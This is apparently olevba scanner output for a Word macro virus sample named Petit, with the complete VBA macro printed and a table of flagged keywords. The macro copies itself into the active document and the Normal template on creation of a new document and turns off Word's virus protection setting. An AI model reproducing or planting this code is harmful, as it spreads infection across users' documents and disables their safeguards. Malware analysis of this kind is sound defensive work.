olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Petit-00a34702f12248c10a6f465a08c8206db6ed4061
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Petit-00a34702f12248c10a6f465a08c8206db6ed4061 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private _
Sub _
AutoNew()
On _
Error _
Resume _
Next
c _
= _
VBE.SelectedVBComponent.CodeModule.Lines(1, _
100)
With _
ActiveDocument.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, _
.countoflines
.AddFromString _
c
End _
With
With _
NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines _
1, _
.countoflines
.AddFromString _
c
End _
With
Options.VirusProtection _
= 0
End _
Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

